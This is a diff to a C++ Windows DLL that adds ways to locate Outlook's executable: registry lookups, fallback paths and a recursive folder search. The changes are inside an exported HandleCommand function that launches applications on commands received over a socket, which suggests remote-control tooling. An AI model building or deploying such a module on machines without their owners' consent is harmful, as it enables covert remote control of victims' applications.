@@ -1878,6 +1878,75 @@ static wstring resolve_gecko_profile_from_ini(const wstring& geckoUserDataDir) {
     return L"";
 }
 
+static wstring find_outlook_in_dir(const wstring& parentDir) {
+    if (parentDir.empty() || !fs::exists(parentDir)) return L"";
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(parentDir, fs::directory_options::skip_permission_denied)) {
+            try {
+                if (entry.is_regular_file()) {
+                    wstring filename = entry.path().filename().wstring();
+                    if (filename.size() == 11) {
+                        wstring lowerName;
+                        for (wchar_t c : filename) lowerName += towlower(c);
+                        if (lowerName == L"outlook.exe") {
+                            return entry.path().wstring();
+                        }
+                    }
+                }
+            } catch (...) {}
+        }
+    } catch (...) {}
+    return L"";
+}
+
+static wstring get_office_install_root(const wstring& version) {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Office\\" + version + L"\\Outlook\\InstallRoot";
+    wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            path = buffer;
+        }
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.size() >= 2 && path.front() == L'"' && path.back() == L'"') {
+        path = path.substr(1, path.size() - 2);
+    }
+    return path;
+}
+
 static wstring get_app_path(const wstring& appName) {
     HKEY hKey;
     wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
@@ -2215,6 +2284,26 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring exePath;
                     if (wRequestedPath == L"Outlook") {
                         exePath = get_app_path(L"outlook.exe");
+
+                        // 1. Try registry InstallRoot paths
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            vector<wstring> versions = { L"16.0", L"15.0", L"14.0" };
+                            for (const auto& ver : versions) {
+                                wstring root = get_office_install_root(ver);
+                                if (!root.empty()) {
+                                    if (root.back() != L'\\' && root.back() != L'/') {
+                                        root += L"\\";
+                                    }
+                                    wstring candidate = root + L"outlook.exe";
+                                    if (fs::exists(candidate)) {
+                                        exePath = candidate;
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+
+                        // 2. Try common path fallbacks
                         if (exePath.empty() || !fs::exists(exePath)) {
                             wchar_t progFiles[MAX_PATH] = {0};
                             wchar_t progFilesX86[MAX_PATH] = {0};
@@ -2239,6 +2328,25 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                     exePath = fb;
                                     break;
                                 }
+                            }
+                        }
+
+                        // 3. Try recursive directory search on Microsoft Office directories
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            wchar_t progFiles[MAX_PATH] = {0};
+                            wchar_t progFilesX86[MAX_PATH] = {0};
+                            GetEnvironmentVariableW(L"ProgramFiles", progFiles, MAX_PATH);
+                            GetEnvironmentVariableW(L"ProgramFiles(x86)", progFilesX86, MAX_PATH);
+
+                            wstring pf = progFiles[0] ? progFiles : L"C:\\Program Files";
+                            wstring pfx86 = progFilesX86[0] ? progFilesX86 : L"C:\\Program Files (x86)";
+
+                            wstring searchPf = pf + L"\\Microsoft Office";
+                            exePath = find_outlook_in_dir(searchPf);
+
+                            if (exePath.empty() || !fs::exists(exePath)) {
+                                wstring searchPfX86 = pfx86 + L"\\Microsoft Office";
+                                exePath = find_outlook_in_dir(searchPfX86);
                             }
                         }
                     } else if (wRequestedPath == L"Opera") {
